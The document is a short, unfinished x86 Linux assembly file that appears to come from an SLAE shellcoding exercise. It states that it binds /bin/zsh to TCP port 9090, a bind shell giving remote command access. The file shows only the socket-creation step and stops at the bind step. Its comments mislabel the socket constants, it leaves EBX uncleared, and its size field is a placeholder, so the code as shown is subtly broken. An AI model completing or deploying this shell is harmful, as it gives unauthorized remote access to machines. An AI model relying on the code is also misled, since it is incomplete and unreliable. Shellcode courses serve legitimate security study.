;
; Linux x86
; Author:  thryb
; Date:    13-07-16
; Purpose: Bind /bin/zsh to TCP port 9090
; Size:    XX bytes
; ID:      SLAE-770
;

global _start

section .text
_start:

	; 1 - create socket
	; socket(AF_INET, SOCK_STREAM, 0);
	xor eax, eax ; null aex
	push eax ; 3rd arg of socket (0)
	mov al, 0x66 ; sys_socketcall = 102 (http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html)
	mov bl, 0x1 ; socketcall() socket = 1
	push 0x2 ; arg (SOCK_STREAM)
	push 0x1 ; arg (AF_INET)
	mov ecx, esp ; mov stack ptr to ecx
	int 0x80 ; init

	; 2 - bind socket
		
